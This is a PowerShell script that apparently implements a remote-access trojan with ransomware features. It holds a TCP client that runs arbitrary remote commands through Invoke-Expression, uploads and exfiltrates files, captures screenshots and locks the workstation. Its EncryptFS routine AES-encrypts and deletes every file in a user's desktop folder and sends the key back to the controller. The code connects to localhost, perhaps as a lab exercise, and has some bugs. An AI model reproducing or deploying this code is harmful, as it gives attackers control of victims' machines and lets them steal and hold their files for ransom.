
function ScreenShot()
{
    [Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null

    function screenshot([Drawing.Rectangle]$bounds, $path) 
    {
        $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
        $graphics = [Drawing.Graphics]::FromImage($bmp)

        $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

        $bmp.Save($path)

        $graphics.Dispose()

        $bmp.Dispose()
    }

    $query = Get-CIMInstance -ClassName Win32_VideoController

    $x_sum = 0
    $y_sum = 0

    $query | Foreach-Object {
                                $x = $_.CurrentHorizontalResolution
                                $y = $_.CurrentVerticalResolution 

                                if($x -and $y)
                                {
                                    $x_sum += $x 
                                    $y_sum += $y
                                }

                            }

    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $x_sum, $y_sum)
    $computerName = $env:COMPUTERNAME
    $dateTime = Get-Date -Format "MM_dd_yyyy_hh_mm_ss"
    $imageTitle = "Screen_Shot_"+$computerName+'_'+$dateTime+"_.jpg"

    screenshot $bounds ".\$imageTitle"

    return $imageTitle
}

function EncryptFS()
{
    $prng   = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $cipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $key    = [System.Byte[]]::new(32) 
    $prng.GetBytes($key)
    $cur_path  = (Get-Location).Path
    $filename  = 'aes.key'
    $key_path  = $cur_path+"\"+$filename
    $file_path = $cur_path+"\"+$file
    $key | Out-File -FilePath $key_path 
    $iv = [System.Byte[]]::new(16)
    $prng.GetBytes($iv)
    $cipher.Key = $key
    $cipher.IV  = $iv
    $base_path  = "C:\Users\amnesiac\Desktop\"
    Get-ChildItem -Path $base_path | Foreach-Object {
                                                        $current_file = $_.FullName

                                                        if((Get-ChildItem $current_file) -is [System.IO.FileInfo])
                                                        {
                                                            try
                                                            {
                                                                $new_file_name = $current_file+'.enc'
                                                                $file_content  = [System.IO.File]::ReadAllBytes($current_file)
                                                                $cipher_obj    = $cipher.CreateEncryptor()
                                                                $enc_bytes     = $cipher_obj.TransformFinalBlock($file_content, 0, $file_content.Length)
                                                                [byte[]]$enc_bytes_iv   = $cipher.IV+$enc_bytes
                                                                $ciphertext = [System.Convert]::ToBase64String($enc_bytes_iv)
                                                                $current_path   = (Get-Location).Path ; Write-Host $current_path
                                                                Set-Content -Path $new_file_name -Value $ciphertext 
                                                                Remove-Item $current_file
                                                            }
                                                            catch
                                                            {
                                                                continue
                                                            }
                                                        }
                                                    }
    $cipher.Dispose()
    $prng.Dispose()
}

function DecryptFS()
{
    if(!(Test-Path "aes.key"))
    {
        return
    }
    $key        = Get-Content "aes.key"
    $cipher     = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $cipher.Key = $key
    $base_path  = "C:\Users\amnesiac\Desktop\"
    Get-ChildItem -Path $base_path | Foreach-Object {
                                                            $current_file = $_.FullName ; Write-Host $current_file
                                                            
                                                            if(($current_file | Select-String '.enc') -and ($current_file -ne 'aes.key'))
                                                            {
                                                                try
                                                                {
                                                                    Write-Host $current_file
                                                                    $segments            = $current_file.Split('.')
                                                                    $decrypted_file_name = $segments[0]+"."+$segments[1]
                                                                    Write-Host $decrypted_file_name
                                                                    $ct_file_content = Get-Content $current_file
                                                                    $ct_file_content = [System.Convert]::FromBase64String($ct_file_content)
                                                                    $cipher.IV       = $ct_file_content[0..15]
                                                                    $decipher_obj    = $cipher.CreateDecryptor()
                                                                    $plaintext  = $decipher_obj.TransformFinalBlock($ct_file_content, 16, $ct_file_content.Length-16)
                                                                    Set-Content -Path $decrypted_file_name -Value $plaintext -Encoding Byte
                                                                    Remove-Item $current_file
                                                                }
                                                                catch
                                                                {
                                                                    continue
                                                                }
                                                            }
                                                    }
    $cipher.Dispose()
}

function PSClient($addr,$port)
{
    try
    {
        $s = New-Object Net.Sockets.TcpClient($addr,$port)

        if($s)
        {
            Write-Host "[*] Connected"
        }
    }
    catch
    {
        return 
    }

    while($s.Connected)
    {
            $stream      = $s.GetStream()
            $transmitter = New-Object System.IO.StreamWriter($stream)
            $receiver    = New-Object System.IO.StreamReader($stream)

            $intake      = $receiver.ReadLine()

            if($intake)
            {
                if($intake | Select-String 'send')
                {
                    $filename = $intake.Split('#')[1] 
                    $content  = [System.Convert]::FromBase64String($intake.Split('#')[2])
                    Set-Content -Path ".\$filename" -Value $content -Encoding Byte
                    continue
                }
                if($intake | Select-String 'download')
                {
                    $fileName = $intake.Split(' ')[1]
                    if(Test-Path $fileName)
                    {
                        $filename = Split-Path $filename -leaf
                        $data = Get-Content $filename -Encoding Byte
                        $data = [System.Convert]::ToBase64String($data)
                        $transmitter.WriteLine($data)
                        $transmitter.Flush()
                        continue
                    }
                    else 
                    {
                        $response = '[!] Failed to download file '
                        $response = [System.Text.Encoding]::Unicode.GetBytes($response)
                        $response = [Convert]::ToBase64String($result)
                        $transmitter.WriteLine($response)
                        $transmitter.Flush()
                        continue
                    }
                }
                if($intake | select-String 'encryptfs')
                {
                    EncryptFS
                    $filename = 'aes.key'
                    $data     = Get-Content $filename -Encoding Byte
                    $data     = [System.Convert]::ToBase64String($data)
                    $transmitter.WriteLine($data)
                    $transmitter.Flush()
                    Remove-Item $filename
                    continue
                }
                if($intake | Select-String 'decryptfs')
                {
                    $filename = $intake.Split('#')[1] 
                    $content  = [System.Convert]::FromBase64String($intake.Split('#')[2])
                    Set-Content -Path ".\$filename" -Value $content -Encoding Byte
                    DecryptFS
                    Remove-Item $filename
                    continue
                }
                if($intake | Select-String 'screenshot')
                {
                    $image = ScreenShot
                    if(Test-Path $image)
                    {
                        $filename = Split-Path $image -leaf
                        $data = Get-Content $filename -Encoding Byte
                        $data = [System.Convert]::ToBase64String($data)
                        $transmission = "$filename#$data" 
                        $transmitter.WriteLine($transmission)
                        $transmitter.Flush()
                        continue
                    }
                    else 
                    {
                        $response = '[!] Failed to locate screenshot '
                        $response = [System.Text.Encoding]::Unicode.GetBytes($response)
                        $response = [Convert]::ToBase64String($result)
                        $transmitter.WriteLine($response)
                        $transmitter.Flush()
                        continue
                    }

                }
                if($intake | Select-String 'lockscreen')
                {
                    try
                    {
                        rundll32.exe user32.dll,LockWorkStation
                    }
                    catch 
                    {
                        continue
                    }
                }
                if($intake | Select-String 'menu')
                {
                    continue
                }
                if($intake | Select-String 'genkey')
                {
                    $key_path = GenKey
                }
                else 
                {
                    if($intake -ne $null)
                    {
                        $decoded_intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
                        $cmd                 = $decoded_intake
                        Write-Host $cmd
                        if($cmd | Select-String 'exit')
                        {
                            $transmitter.Dispose()
                            $receiver.Dispose()
                            $s.Close()
                            exit
                        }
                        $result              = Invoke-Expression $cmd | Out-String 
                        $result              = [System.Text.Encoding]::Unicode.GetBytes($result)
                        $result              = [Convert]::ToBase64String($result)
                        $transmitter.WriteLine($result)
                        $transmitter.Flush()
                    }
                }
            }
    }
}

PSClient localhost 8080